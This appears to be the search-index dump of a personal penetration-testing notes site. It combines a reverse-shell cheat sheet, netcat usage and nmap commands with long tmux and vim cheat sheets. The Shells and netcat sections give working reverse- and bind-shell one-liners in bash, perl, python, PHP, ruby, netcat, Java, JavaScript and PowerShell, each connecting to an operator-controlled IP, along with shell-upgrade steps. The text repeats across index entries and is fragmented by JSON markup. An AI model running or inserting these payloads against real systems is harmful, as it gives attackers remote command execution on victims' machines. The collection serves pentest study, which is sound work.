require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]') xterm One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001. xterm -display 10.0.0.1:1 To catch the incoming xterm, start an X-Server (:1 \u2013 which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system): Xnest :1 You\u2019ll need to authorize the target to connect to you (command also run on your host): xhost +targetip Powershell Reverse Shell (Inside Powershell.exe) $client = New-Object System.Net.Sockets.TCPClient( 127.0.0.1 ,8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + PS + (pwd).Path + ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() Powershell Reverse Shell (Inside cmd) powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + ' ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() Upgrading Shells python -c 'import pty; pty.spawn(\"/bin/bash\")' Background shell with Ctrl+Z echo $TERM tput lines tput cols - (note this, it will disappear) stty raw -echo fg reset export SHELL=bash export TERM=xterm-256color - (refer to step 3) stty rows 38 columns 116 - (refer to step 3) Sources: pentestmonkey NaviSec Delta","title":"Shells"},{"location":"shells/#find-out-which-programs-are-installed","text":"for item in $(echo nmap nc perl python ruby gcc wget sudo curl ); do which $item; done`","title":"Find out which programs are installed"},{"location":"shells/#bash","text":"bash -i /dev/tcp/10.0.0.1/8080 0 1","title":"Bash"},{"location":"shells/#perl","text":"perl -e 'use Socket;$i= 10.0.0.1 ;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname( tcp ));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, S );open(STDOUT, S );open(STDERR, S );exec( /bin/sh -i );};'","title":"Perl"},{"location":"shells/#python","text":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.0.0.1 ,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]);'","title":"Python"},{"location":"shells/#php","text":"My favorite web shell: p0wny-shell php -r '$sock=fsockopen( 10.0.0.1 ,1234);exec( /bin/sh -i 3 3 2 3 );' For those situations when a PHP command injection shell spawns and immediately dies, this will run in the background: function execInBackground($cmd) { if (substr(php_uname(), 0, 7) == Windows ){ pclose(popen( start /B . $cmd, r )); } else { exec($cmd . /dev/null ); } } execInBackground( /bin/bash -c 'bash -i /dev/tcp/192.168.1.221/8081 0 1' );","title":"PHP"},{"location":"shells/#ruby","text":"ruby -rsocket -e'f=TCPSocket.open( 10.0.0.1 ,1234).to_i;exec sprintf( /bin/sh -i %d %d 2 %d ,f,f,f)'","title":"Ruby"},{"location":"shells/#netcat","text":"nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc 10.0.0.1 1234 /tmp/f","title":"Netcat"},{"location":"shells/#java","text":"r = Runtime.getRuntime() p = r.exec([ /bin/bash , -c , exec 5 /dev/tcp/10.0.0.1/2002;cat 5 | while read line; do \\$line 2 5 5; done ] as String[]) p.waitFor()","title":"Java"},{"location":"shells/#javascript","text":"var spawn = require('child_process').spawn; var net = require('net'); var reconnect = require('reconnect'); reconnect(function (stream) { var ps = spawn('bash', [ '-i' ]); stream.pipe(ps.stdin); ps.stdout.pipe(stream, { end: false }); ps.stderr.pipe(stream, { end: false }); ps.on('exit', function () { stream.end() }); }).connect(5500, '192.168.60.124'); require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')","title":"JavaScript"},{"location":"shells/#xterm","text":"One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001. xterm -display 10.0.0.1:1 To catch the incoming xterm, start an X-Server (:1 \u2013 which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system): Xnest :1 You\u2019ll need to authorize the target to connect to you (command also run on your host): xhost +targetip","title":"xterm"},{"location":"shells/#powershell-reverse-shell-inside-powershellexe","text":"$client = New-Object System.Net.Sockets.TCPClient( 127.0.0.1 ,8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + PS + (pwd).Path + ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()","title":"Powershell Reverse Shell (Inside Powershell.exe)"},{"location":"shells/#powershell-reverse-shell-inside-cmd","text":"powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + ' ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()","title":"Powershell Reverse Shell (Inside cmd)"},{"location":"shells/#upgrading-shells","text":"python -c 'import pty; pty.spawn(\"/bin/bash\")' Background shell with Ctrl+Z echo $TERM tput lines tput cols - (note this, it will disappear) stty raw -echo fg reset export SHELL=bash export TERM=xterm-256color - (refer to step 3) stty rows 38 columns 116 - (refer to step 3) Sources: pentestmonkey NaviSec Delta","title":"Upgrading Shells"},{"location":"tools/","text":"Scripts LinEnum.sh hydra metasploit Netcat nmap pspy sparta tmux Vim","title":"Tools"},{"location":"tools/#scripts","text":"","title":"Scripts"},{"location":"tools/#linenumsh","text":"","title":"LinEnum.sh"},{"location":"tools/#hydra","text":"","title":"hydra"},{"location":"tools/#metasploit","text":"","title":"metasploit"},{"location":"tools/#netcat","text":"","title":"Netcat"},{"location":"tools/#nmap","text":"","title":"nmap"},{"location":"tools/#pspy","text":"","title":"pspy"},{"location":"tools/#sparta","text":"","title":"sparta"},{"location":"tools/#tmux","text":"","title":"tmux"},{"location":"tools/#vim","text":"","title":"Vim"},{"location":"useful links/","text":"Reddit https://www.reddit.com/r/oscp/ Blogs https://highon.coffee/ https://www.gnucitizen.org/ https://potatofrom.space/ https://blog.ropnop.com/ Techniques https://0x00sec.org/ https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html https://netsec.ws/ http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://delta.navisec.io/reverse-shell-reference/#upgrading-shells https://github.com/frizb/Windows-Privilege-Escalation News https://news.ycombinator.com/ Tutorials IppSec","title":"Useful Links"},{"location":"useful links/#reddit","text":"https://www.reddit.com/r/oscp/","title":"Reddit"},{"location":"useful links/#blogs","text":"https://highon.coffee/ https://www.gnucitizen.org/ https://potatofrom.space/ https://blog.ropnop.com/","title":"Blogs"},{"location":"useful links/#techniques","text":"https://0x00sec.org/ https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html https://netsec.ws/ http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://delta.navisec.io/reverse-shell-reference/#upgrading-shells https://github.com/frizb/Windows-Privilege-Escalation","title":"Techniques"},{"location":"useful links/#news","text":"https://news.ycombinator.com/","title":"News"},{"location":"useful links/#tutorials","text":"IppSec","title":"Tutorials"},{"location":"tools/hydra/","text":"","title":"Hydra"},{"location":"tools/metasploit/","text":"","title":"Metasploit"},{"location":"tools/netcat/","text":"General Listener Unless otherwise noted, most of these will require an established listener: nc -nvlp 1337 Transfer a file Sender nc -nv IP Address input.txt Recipient nc -lvp 4444 output.txt Set up a Netcat Bind Shell (Windows) nc -lvp 4444 -e cmd.exe Set up a Netcat Bind Shell (Linux) nc -lvp 4444 -e /bin/sh Set up a Netcat Reverse Shell (Windows) nc -nv IP Address 443 -e cmd.exe Set up a Netcat Reverse Shell (Linux) nc -nv IP Address 443 -e /bin/sh Netcat as a Port Scanner nc -z IP Address Port Range in abc - xyz format Netcat as a Banner Grabber echo | nc -nv -w1 IP Address Ports Sources : Netsec","title":"General Listener"},{"location":"tools/netcat/#general-listener","text":"Unless otherwise noted, most of these will require an established listener: nc -nvlp 1337","title":"General Listener"},{"location":"tools/netcat/#transfer-a-file","text":"Sender nc -nv IP Address input.txt Recipient nc -lvp 4444 output.txt","title":"Transfer a file"},{"location":"tools/netcat/#set-up-a-netcat-bind-shell-windows","text":"nc -lvp 4444 -e cmd.exe","title":"Set up a Netcat Bind Shell (Windows)"},{"location":"tools/netcat/#set-up-a-netcat-bind-shell-linux","text":"nc -lvp 4444 -e /bin/sh","title":"Set up a Netcat Bind Shell (Linux)"},{"location":"tools/netcat/#set-up-a-netcat-reverse-shell-windows","text":"nc -nv IP Address 443 -e cmd.exe","title":"Set up a Netcat Reverse Shell (Windows)"},{"location":"tools/netcat/#set-up-a-netcat-reverse-shell-linux","text":"nc -nv IP Address 443 -e /bin/sh","title":"Set up a Netcat Reverse Shell (Linux)"},{"location":"tools/netcat/#netcat-as-a-port-scanner","text":"nc -z IP Address Port Range in abc - xyz format","title":"Netcat as a Port Scanner"},{"location":"tools/netcat/#netcat-as-a-banner-grabber","text":"echo | nc -nv -w1 IP Address Ports Sources : Netsec","title":"Netcat as a Banner Grabber"},{"location":"tools/nmap/","text":"nmap My go-to thanks to IppSec: nmap -sC -sV -oA nmap/help IP -sC equivalent to --script=default -sV = Probe open ports to determine service/version info Ping scan nmap -sP 10.0.0.0/24 Other great resources: * https://nmap.org/book/man.html * https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf * https://highon.coffee/blog/nmap-cheat-sheet/","title":"nmap"},{"location":"tools/nmap/#nmap","text":"My go-to thanks to IppSec: nmap -sC -sV -oA nmap/help IP -sC equivalent to --script=default -sV = Probe open ports to determine service/version info Ping scan nmap -sP 10.0.0.0/24 Other great resources: * https://nmap.org/book/man.html * https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf * https://highon.coffee/blog/nmap-cheat-sheet/","title":"nmap"},{"location":"tools/sparta/","text":"Sparta Source Kali Reference","title":"Sparta"},{"location":"tools/sparta/#sparta","text":"Source Kali Reference","title":"Sparta"},{"location":"tools/tmux/","text":"tmux Shortcuts Cheatsheet I recommend installing this .tmux.conf file for the following reasons: Prefix is changed to Ctrl + a Mouse mode can be enabled ( prefix + m ) Check out the \"Features\" list Start new: tmux Start new with session name: tmux new -s myname Attach: tmux a # (or at, or attach) Attach to named: tmux a -t myname List sessions: tmux ls kill session: tmux kill-session -t myname Kill all the tmux sessions: tmux ls | grep : | cut -d. -f1 | awk '{print substr($1, 0, length($1)-1)}' | xargs kill In tmux, hit the prefix Ctrl+b (my modified prefix is Ctrl+a ) and then: Sessions :new CR new session s list sessions $ name session Windows (tabs) c create window w list windows n next window p previous window f find window , name window kill window Panes (splits) % vertical split \" horizontal split o swap panes q show pane numbers x kill pane + break pane into window (e.g. to select text by mouse to copy) - restore pane from window \u237d space - toggle between layouts prefix q (Show pane numbers, when the numbers show up type the key to goto that pane) prefix { (Move the current pane left) prefix } (Move the current pane right) prefix z toggle pane zoom Sync Panes You can do this by switching to the appropriate window, typing your Tmux prefix (commonly Ctrl-B or Ctrl-A) and then a colon to bring up a Tmux command line, and typing: :setw synchronize-panes You can optionally add on or off to specify which state you want; otherwise the option is simply toggled. This option is specific to one window, so it won\u2019t change the way your other sessions or windows operate. When you\u2019re done, toggle it off again by repeating the command. tip source Resizing Panes You can also resize panes if you don\u2019t like the layout defaults. I personally rarely need to do this, though it\u2019s handy to know how. Here is the basic syntax to resize panes: PREFIX : resize-pane -D (Resizes the current pane down) PREFIX : resize-pane -U (Resizes the current pane upward) PREFIX : resize-pane -L (Resizes the current pane left) PREFIX : resize-pane -R (Resizes the current pane right) PREFIX : resize-pane -D 20 (Resizes the current pane down by 20 cells) PREFIX : resize-pane -U 20 (Resizes the current pane upward by 20 cells) PREFIX : resize-pane -L 20 (Resizes the current pane left by 20 cells) PREFIX : resize-pane -R 20 (Resizes the current pane right by 20 cells) PREFIX : resize-pane -t 2 20 (Resizes the pane with the id of 2 down by 20 cells) PREFIX : resize-pane -t -L 20 (Resizes the pane with the id of 2 left by 20 cells) Copy mode: Pressing PREFIX [ places us in Copy mode. We can then use our movement keys to move our cursor around the screen. By default, the arrow keys work. we set our configuration file to use Vim keys for moving between windows and resizing panes so we wouldn\u2019t have to take our hands off the home row. tmux has a vi mode for working with the buffer as well. To enable it, add this line to .tmux.conf: setw -g mode-keys vi With this option set, we can use h, j, k, and l to move around our buffer. To get out of Copy mode, we just press the ENTER key. Moving around one character at a time isn\u2019t very efficient. Since we enabled vi mode, we can also use some other visible shortcuts to move around the buffer. For example, we can use \"w\" to jump to the next word and \"b\" to jump back one word. And we can use \"f\", followed by any character, to jump to that character on the same line, and \"F\" to jump backwards on the line. Function vi emacs Back to indentation ^ M-m Clear selection Escape C-g Copy selection Enter M-w Cursor down j Down Cursor left h Left Cursor right l Right Cursor to bottom line L Cursor to middle line M M-r Cursor to top line H M-R Cursor up k Up Delete entire line d C-u Delete to end of line D C-k End of line $ C-e Goto line : g Half page down C-d M-Down Half page up C-u M-Up Next page C-f Page down Next word w M-f Paste buffer p C-y Previous page C-b Page up Previous word b M-b Quit mode q Escape Scroll down C-Down or J C-Down Scroll up C-Up or K C-Up Search again n n Search backward ? C-r Search forward / C-s Start of line 0 C-a Start selection Space C-Space Transpose chars C-t Misc d detach t big clock ? list shortcuts : prompt Configurations Options: # Mouse support - set to on if you want to use the mouse * setw -g mode-mouse off * set -g mouse-select-pane off * set -g mouse-resize-pane off * set -g mouse-select-window off # Set the default terminal mode to 256color mode set -g default-terminal \"screen-256color\" # enable activity alerts setw -g monitor-activity on set -g visual-activity on # Center the window list set -g status-justify centre # Maximize and restore a pane unbind Up bind Up new-window -d -n tmp \\; swap-pane -s tmp.1 \\; select-window -t tmp unbind Down bind Down last-window \\; swap-pane -s tmp.1 \\; kill-window -t tmp Resources: tmux: Productive Mouse-Free Development How to reorder windows Source Updated 22 July 2019","title":"tmux Shortcuts & Cheatsheet"},{"location":"tools/tmux/#tmux-shortcuts-cheatsheet","text":"I recommend installing this .tmux.conf file for the following reasons: Prefix is changed to Ctrl + a Mouse mode can be enabled ( prefix + m ) Check out the \"Features\" list Start new: tmux Start new with session name: tmux new -s myname Attach: tmux a # (or at, or attach) Attach to named: tmux a -t myname List sessions: tmux ls kill session: tmux kill-session -t myname Kill all the tmux sessions: tmux ls | grep : | cut -d. -f1 | awk '{print substr($1, 0, length($1)-1)}' | xargs kill In tmux, hit the prefix Ctrl+b (my modified prefix is Ctrl+a ) and then:","title":"tmux Shortcuts &amp; Cheatsheet"},{"location":"tools/tmux/#sessions","text":":new CR new session s list sessions $ name session","title":"Sessions"},{"location":"tools/tmux/#resizing-panes","text":"You can also resize panes if you don\u2019t like the layout defaults. I personally rarely need to do this, though it\u2019s handy to know how. Here is the basic syntax to resize panes: PREFIX : resize-pane -D (Resizes the current pane down) PREFIX : resize-pane -U (Resizes the current pane upward) PREFIX : resize-pane -L (Resizes the current pane left) PREFIX : resize-pane -R (Resizes the current pane right) PREFIX : resize-pane -D 20 (Resizes the current pane down by 20 cells) PREFIX : resize-pane -U 20 (Resizes the current pane upward by 20 cells) PREFIX : resize-pane -L 20 (Resizes the current pane left by 20 cells) PREFIX : resize-pane -R 20 (Resizes the current pane right by 20 cells) PREFIX : resize-pane -t 2 20 (Resizes the pane with the id of 2 down by 20 cells) PREFIX : resize-pane -t -L 20 (Resizes the pane with the id of 2 left by 20 cells)","title":"Resizing Panes"},{"location":"tools/tmux/#copy-mode","text":"Pressing PREFIX [ places us in Copy mode. We can then use our movement keys to move our cursor around the screen. By default, the arrow keys work. we set our configuration file to use Vim keys for moving between windows and resizing panes so we wouldn\u2019t have to take our hands off the home row. tmux has a vi mode for working with the buffer as well. To enable it, add this line to .tmux.conf: setw -g mode-keys vi With this option set, we can use h, j, k, and l to move around our buffer. To get out of Copy mode, we just press the ENTER key. Moving around one character at a time isn\u2019t very efficient. Since we enabled vi mode, we can also use some other visible shortcuts to move around the buffer. For example, we can use \"w\" to jump to the next word and \"b\" to jump back one word. And we can use \"f\", followed by any character, to jump to that character on the same line, and \"F\" to jump backwards on the line. Function vi emacs Back to indentation ^ M-m Clear selection Escape C-g Copy selection Enter M-w Cursor down j Down Cursor left h Left Cursor right l Right Cursor to bottom line L Cursor to middle line M M-r Cursor to top line H M-R Cursor up k Up Delete entire line d C-u Delete to end of line D C-k End of line $ C-e Goto line : g Half page down C-d M-Down Half page up C-u M-Up Next page C-f Page down Next word w M-f Paste buffer p C-y Previous page C-b Page up Previous word b M-b Quit mode q Escape Scroll down C-Down or J C-Down Scroll up C-Up or K C-Up Search again n n Search backward ? C-r Search forward / C-s Start of line 0 C-a Start selection Space C-Space Transpose chars C-t","title":"Copy mode:"},{"location":"tools/tmux/#misc","text":"d detach t big clock ? list shortcuts : prompt","title":"Misc"},{"location":"tools/tmux/#configurations-options","text":"# Mouse support - set to on if you want to use the mouse * setw -g mode-mouse off * set -g mouse-select-pane off * set -g mouse-resize-pane off * set -g mouse-select-window off # Set the default terminal mode to 256color mode set -g default-terminal \"screen-256color\" # enable activity alerts setw -g monitor-activity on set -g visual-activity on # Center the window list set -g status-justify centre # Maximize and restore a pane unbind Up bind Up new-window -d -n tmp \\; swap-pane -s tmp.1 \\; select-window -t tmp unbind Down bind Down last-window \\; swap-pane -s tmp.1 \\; kill-window -t tmp","title":"Configurations Options:"},{"location":"tools/tmux/#resources","text":"tmux: Productive Mouse-Free Development How to reorder windows Source Updated 22 July 2019","title":"Resources:"},{"location":"tools/vim/","text":"Introduction C-a == Ctrl-a M-a == Alt-a General :q close :w write/saves :wa[!] write/save all windows [force] :wq write/save and close :x save and quit, same as wq :q! force close if file has changed and not save changes v Enter visual mode for selection of LINES C-v Enter visual mode for selection of BLOCKS y Yank/copy selected region yy Yank/copy entire line reg y Yank/copy marked region into register reg (register from a-z) c Cut selection p Paste yanked content reg p Paste yanked content in register reg (from a-z) P Paste yanked content BEFORE u Undo C-r Redo :! cmd Execute shell command cmd C-z send vim to background (fg brings it to front again) Windows C-ws Split current window horizontally (alternative :split) C-wv Split current window vertically (alternative :vsplit) C-ww Jump to the next window C-wARROW Jump to window left/right/top/bottom (arrow keys) to the current C-w# Shrink/resize current window from the right by # (default 1) C-w# Increase/resize current window to the right by # (default 1) Entering insert mode a Append text after the cursor A Append text at the end of the line i Insert text before the cursor I Insert text before the first non-blank in the line o Begin a new line BELOW the cursor and insert text O Begin a new line ABOVE the cursor and insert text s Erase the current letter under the cursor, set insert-mode S Erase the whole line, set insert-mode cc Delete the current line, set insert-mode cw Delete word, set insert-mode dd Delete line under curser Recording Vim has 26 registers (a-z), select the one you want to record in, see below. Exit Record mode with ESC q[a-z] Start recording, everything will be recorded including movement actions. @[a-z] Execute the recorded actions. Spell checking See vimcast #19 as an introduction: http://vimcasts.org/episodes/spell-checking/ Assuming that you have the following in .vimrc: nnoremap silent leader s :set spell! cr leader s Toggle Spelling ]s Next spelling mistake [s Previous spelling mistake z= Give Suggestions (prepent 1, use first suggestions automatically) zg Add misspelled to spellfile zug Remove word from spellfile see http://vimdoc.sourceforge.net/htmldoc/spell.html Navigation essential h cursor left j cursor down l cursor right k cursor up H Jump to TOP of screen M Jump to MIDDLE of screen L Jump to BOTTOM of screen C-b Move back one full screen (page up) C-f Move forward one full screen (page down) C-d Move forward 1/2 screen; half page down C-u Move back (up) 1/2 screen; half page up w jump by start of words (punctuation considered words) e jump to end of words (punctuation considered words) b jump backward by words (punctuation considered words) 0 (zero) start of line ^ first non-blank character of line $ end of line G bottom of file gg top of file good to know E jump to end of words (no punctuation) W jump by words (spaces separate words) B jump backward by words (no punctuation) #G goto line # #gg goto line # Search, jump consider consulting :help [ and :help g * search for word under cursor (forward) and highlight occurrence (see incsearch, hlsearch below) % jump from open/close ( / #if / ( / { to corresponding ) / #endif / } [{ jump to start of current code block ]} jump to end of current code block gd jump to var declaration (see incsearch, hlsearch below) f c Find char c from current cursor position -- forwards F c Find char c from current cursor position -- backwards , Repeat previous f c or F c in opposite direction ; Repeat previous f c or F c in same direction '. jump back to last edited line. g; jump back to last edited position. [m jump to start of funtion body [i show first declartion/use of the word under cursor [I show all occurrences of word under cursor in current file [/ cursor to N previous start of a C comment vimgrep and quickfix list built-in grep, vimgrep uses vim's quickfix list. see vimcasts#44 for introduction: http://vimcasts.org/episodes/search-multiple-files-with-vimgrep/ :vimgrep / regex /g % Search for regex with multiple occasions per line (g) in current file (%) :vimgrep / C-r // % On the command line, C-r / (that is: CTRL-R followed by /) will insert the last search pattern. :vimgrep / a /g filelist Search in the given files ( filelist ) :vimgrep / a /g *.cc Search in all *.cc files current directory :vimgrep / a /g **/*.cc Search in all *.cc files in every sub-directory (recursively) :vimgrep / a /g `find . -type f` Search in all files that are returns by the backtick command. :vim short for :vimgrep :cnext Jump to next record/match in quickfix list :cprev Jump to previous record/match in quickfix list Unimpaired plugin (https://github.com/tpope/vim-unimpaired) provides the following mappings: [q see :cprev ]q see :cnext [Q see :cfirst ]Q see :clast see also: http://usevim.com/2012/08/24/vim101-quickfix/ and http://vimdoc.sourceforge.net/htmldoc/quickfix.html Marks Mark a position in a buffer and jump back to it. see also http://vim.wikia.com/wiki/Using_marks ma set mark a at current cursor location 'a jump to line of mark a (first non-blank character in line) `a jump to position (line and column) of mark a d'a delete from current line to line of mark a d`a delete from current cursor position to position of mark a c'a change text from current line to line of mark a y`a yank text to unnamed buffer from cursor to position of mark a :marks list all the current marks :marks aB list marks a, B (text is copied from link above) Editing x Delete char UNDER cursor X Delete char BEFORE cursor #x Delete the next # chars. starting from char under cursor dw Delete next word dW Delete UP TO the next word d^ Delete up unto the beginning of the line d$ Delete until end of the line D See d$, delete until end of the line dd Delete whole line dib Delete contents in parenthesis '(' ')' block (e.g. function args) diB Delete inner '{' '}' block daB Delete a '{' '}' block das Delete a senctence diw Delete word under cursor df c Delete until next occurence of c (char) found (including c ) [in single line] dt c Delete until next occurence of c (char) found (without c !!!) [in single line] ciw Change word under cursor ciB Change inner '{' '}' block cf c See df c but change instead of delete ct c See dt c but change instead of delete #J Merge # number of lines together gq (in visual-mode) format selected text according to line-width gqq format current line according to line-width #gqq format next #-lines C-n Keyword completion Tab Keyword completion (SuperTab plugin) r c Replace char c #r c Replace follow # chars with c , : csock, cursor on s, 3re ceeek :s/xxx/yyy/ Replace xxx with yyy at the first occurrence :s/xxx/yyy/g Replace xxx with yyy first occurrence, global (whole sentence) :s/xxx/yyy/gc Replace xxx with yyy global with confirm :%s/xxx/yyy/g Replace xxx with yyy global in the whole file u Convert selection (visual mode) to lowercase U Convert selection (visual mode) to uppercase :g/^#/d Delete all lines that begins with # :g/^$/d Delete all lines that are empty Misc ga Show ASCII of char under cursor Key sequences Replace a word in a number of occurrences with 'bar'; use word under cursor ( * or /foo ) * cw bar ESC n . * word under cursor 'foo' cw change word (enter insert mode) bar typed new word 'bar' ESC exit insert mode n next occurrence . repeat previous command Insert 3 times \"Help!\": Help! Help! Help! 3i Help!_ ESC Insert previously yanked text in line after current oESCp Search for selected text select y / C-r0 select Select text in VISUAL mode (v) y Yank selection / Search for C-r0 Press Ctrl-R and 0 to paste in Comment out selection C-v select # ESC ESC C-v Enter VISUAL block mode sel Select lines # Comment char for programming language (perl, python, bash, etc) ESC Exit ESC Completes adding comment char for previous selected block Abbreviations auto correction of frequently misspelled words. :abbr Lunix Linux :abbr accross across :abbr hte the Configuration If you set the incsearch option, Vim will show the first match for the pattern, while you are still typing it. This quickly shows a typo in the pattern. If you set the hlsearch option, Vim will highlight all matches for the pattern with a yellow background. This gives a quick overview of where the search command will take you. In program code it can show where a variable is used. You don't even have to move the cursor to see the matches. NERD-tree https://github.com/scrooloose/nerdtree/blob/master/doc/NERD_tree.txt F3 Toogle NERD-Tree visible ctrlp.vim https://github.com/kien/ctrlp.vim C-p Open ctrlp window (alternative :CtrlP) :CtrlP d Open CtrlP with specific d = directory C-b Change mode: mru (most recent used) | buffers | files Formating Use gq (see Editing section) for formating lines according to configured line-width. For C++ formating using clang-format see https://github.com/rhysd/vim-clang-format Links Cheat sheets http://www.worldtimzone.com/res/vi.html http://www.fprintf.net/vimCheatSheet.html https://wiki.archlinux.org/index.php/Vim http://www.fprintf.net/vimCheatSheet.html Yet Another Vim Cheat Sheet Articles Seven habits of effective text editing: http://www.moolenaar.net/habits.html Vim After 11 Years: http://statico.github.com/vim.html Coming Home to Vim: http://stevelosh.com/blog/2010/09/coming-home-to-vim tipps and tricks vimcasts.org Video-casts on vim usevim.com Plugin introductions and useful tipps vimregex.com Infos about vims regex engine Productive vim shortcuts http://stackoverflow.com/questions/1218390/what-is-your-most-productive-shortcut-with-vim 100 Vim commands every programmer should know http://www.catswhocode.com/blog/100-vim-commands-every-programmer-should-know VimGenius Interactive vim lesson, with some muscle learn potential Best of VimTips zzapper 15 Years of Vi + 8+ years of Vim and still learning http://rayninfo.co.uk/vimtips.html Use ag (silver searcher) as an indexer for Ctrl-P; and py-matcher for ctrl-p matching function: http://blog.patspam.com/2014/super-fast-ctrlp Command-T authors cheatsheet https://takac.github.io/2013/01/30/vim-grammar/ Plugins NERDTree NERDCommenter Ctrl-P easytags unimpard supertab tagbar omnicomplete (C++) Themes zenburn tango Color column activate colorcolumn: http://stackoverflow.com/questions/1919028/how-to-show-vertical-line-to-wrap-the-line-in-vim set color: http://choorucode.wordpress.com/2011/07/29/vim-set-color-of-colorcolumn/ :set colorcolumn=81 highlight ColorColumn ctermbg=8 Source Updated 22 July 2019","title":"Introduction #"},{"location":"tools/vim/#introduction","text":"C-a == Ctrl-a M-a == Alt-a","title":"Introduction"},{"location":"tools/vim/#general","text":":q close :w write/saves :wa[!] write/save all windows [force] :wq write/save and close :x save and quit, same as wq :q! force close if file has changed and not save changes v Enter visual mode for selection of LINES C-v Enter visual mode for selection of BLOCKS y Yank/copy selected region yy Yank/copy entire line reg y Yank/copy marked region into register reg (register from a-z) c Cut selection p Paste yanked content reg p Paste yanked content in register reg (from a-z) P Paste yanked content BEFORE u Undo C-r Redo :! cmd Execute shell command cmd C-z send vim to background (fg brings it to front again)","title":"General"},{"location":"tools/vim/#windows","text":"C-ws Split current window horizontally (alternative :split) C-wv Split current window vertically (alternative :vsplit) C-ww Jump to the next window C-wARROW Jump to window left/right/top/bottom (arrow keys) to the current C-w# Shrink/resize current window from the right by # (default 1) C-w# Increase/resize current window to the right by # (default 1)","title":"Windows"},{"location":"tools/vim/#entering-insert-mode","text":"a Append text after the cursor A Append text at the end of the line i Insert text before the cursor I Insert text before the first non-blank in the line o Begin a new line BELOW the cursor and insert text O Begin a new line ABOVE the cursor and insert text s Erase the current letter under the cursor, set insert-mode S Erase the whole line, set insert-mode cc Delete the current line, set insert-mode cw Delete word, set insert-mode dd Delete line under curser","title":"Entering insert mode"},{"location":"tools/vim/#recording","text":"Vim has 26 registers (a-z), select the one you want to record in, see below. Exit Record mode with ESC q[a-z] Start recording, everything will be recorded including movement actions. @[a-z] Execute the recorded actions.","title":"Recording"},{"location":"tools/vim/#spell-checking","text":"See vimcast #19 as an introduction: http://vimcasts.org/episodes/spell-checking/ Assuming that you have the following in .vimrc: nnoremap silent leader s :set spell! cr leader s Toggle Spelling ]s Next spelling mistake [s Previous spelling mistake z= Give Suggestions (prepent 1, use first suggestions automatically) zg Add misspelled to spellfile zug Remove word from spellfile see http://vimdoc.sourceforge.net/htmldoc/spell.html","title":"Spell checking"},{"location":"tools/vim/#navigation","text":"essential h cursor left j cursor down l cursor right k cursor up H Jump to TOP of screen M Jump to MIDDLE of screen L Jump to BOTTOM of screen C-b Move back one full screen (page up) C-f Move forward one full screen (page down) C-d Move forward 1/2 screen; half page down C-u Move back (up) 1/2 screen; half page up w jump by start of words (punctuation considered words) e jump to end of words (punctuation considered words) b jump backward by words (punctuation considered words) 0 (zero) start of line ^ first non-blank character of line $ end of line G bottom of file gg top of file good to know E jump to end of words (no punctuation) W jump by words (spaces separate words) B jump backward by words (no punctuation) #G goto line # #gg goto line #","title":"Navigation"},{"location":"tools/vim/#search-jump","text":"consider consulting :help [ and :help g * search for word under cursor (forward) and highlight occurrence (see incsearch, hlsearch below) % jump from open/close ( / #if / ( / { to corresponding ) / #endif / } [{ jump to start of current code block ]} jump to end of current code block gd jump to var declaration (see incsearch, hlsearch below) f c Find char c from current cursor position -- forwards F c Find char c from current cursor position -- backwards , Repeat previous f c or F c in opposite direction ; Repeat previous f c or F c in same direction '. jump back to last edited line. g; jump back to last edited position. [m jump to start of funtion body [i show first declartion/use of the word under cursor [I show all occurrences of word under cursor in current file [/ cursor to N previous start of a C comment","title":"Search, jump"},{"location":"tools/vim/#vimgrep-and-quickfix-list","text":"built-in grep, vimgrep uses 